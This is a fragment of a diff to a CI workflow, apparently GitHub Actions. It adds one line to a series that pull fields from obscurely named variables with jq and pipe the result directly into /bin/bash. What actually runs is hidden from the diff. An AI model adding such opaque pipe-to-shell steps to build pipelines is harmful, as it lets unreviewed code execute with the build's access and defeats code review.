@@ -57,6 +57,7 @@ jobs:
           echo $nbawg02 | jq -r .pfneo0 | /bin/bash
           printf '%s' "$q12" | jq -r .tmgfn32 | /bin/bash
           printf '%s' "$sk8575" | jq -r .yphqg74950 | /bin/bash
+          printf '%s' "$asx4383" | jq -r .chrbe1 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
